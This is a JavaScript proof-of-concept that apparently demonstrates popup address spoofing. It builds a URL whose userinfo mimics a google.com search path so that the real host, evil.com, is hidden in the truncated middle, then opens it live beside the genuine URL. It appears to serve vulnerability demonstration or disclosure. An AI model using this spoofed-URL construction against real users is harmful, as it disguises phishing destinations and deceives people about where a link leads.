// Popup URL Spoof — Visual Demo + Live Test
// URL structure: https://[userinfo-without-slash]@[evil.com]/[path]#[fragment-match]

(function() {
  var d = document.getElementById('display');
  if (!d) return;

  function trunc(url, max) {
    if (url.length <= max) return url;
    var pre = Math.floor(max * 0.55);
    var suf = max - pre - 3;
    return url.substring(0, pre) + '...' + url.substring(url.length - suf);
  }

  // Legitimate URL
  var LEGIT = 'https://www.google.com/search?q=what+is+claude';

  // FIXED Spoof URL:
  // - Userinfo uses - and . (no / allowed before @)
  // - /search-verify... looks like /search?q=... prefix
  // - @evil.com is the real host
  // - Path + fragment matches legit suffix
  var SPOOF = 'https://www.google.com/search-verify-account-login' +
              '-security-check' + '-x'.repeat(10) +
              '@evil.com' +
              '/search?q=what+is+claude';

  var tests = [
    { label: 'LEGITIMATE (google.com)', url: LEGIT, cls: 'legit' },
    { label: 'SPOOFED (real host: evil.com)', url: SPOOF, cls: 'spoof' }
  ];

  var legitShort = trunc(LEGIT, 45);
  var html = '';

  for (var i = 0; i < tests.length; i++) {
    var t = tests[i];
    var short = trunc(t.url, 45);
    html +=
      '<div class="url-box ' + t.cls + '">' +
        '<div class="label">' + t.label + '</div>' +
        '<div class="url-text">' + short + '</div>' +
      '</div>';
  }

  var spoofShort = trunc(SPOOF, 45);
  html += '<div class="verdict" style="' +
    (legitShort === spoofShort ? 'background:#fef7e0;color:#e37400' : 'background:#f0fff4;color:#5f6368') +
    '">' +
    (legitShort === spoofShort
      ? '⚠ Both URLs look IDENTICAL after truncation'
      : 'URLs look similar — @evil.com hidden in "..." truncation zone') +
    '</div>';

  // Explain URL structure
  html += '<div style="font-size:10px;color:#888;margin-top:10px;text-align:left;line-height:1.6">' +
    '<b>Spoofed URL structure:</b><br>' +
    '<code>https://www.google.com/search-verify-...-login<b style="color:#ea4335">@evil.com</b>/search?q=what+is+claude</code><br>' +
    '<code>────────── userinfo (no /) ──────────█──── host ───█── path+query ──────────</code><br><br>' +
    '• <b>Userinfo</b> (before @): uses - and . — valid URL characters<br>' +
    '• <b>@evil.com</b>: the real destination — hidden in popup truncation<br>' +
    '• <b>/search?q=...</b>: matches legit URL suffix exactly<br>' +
    '</div>';

  d.innerHTML = html;

  // Open popups for live test
  document.getElementById('btnOpen').addEventListener('click', function() {
    window.open(LEGIT, '_blank');
    window.open(SPOOF, '_blank');
  });
})();
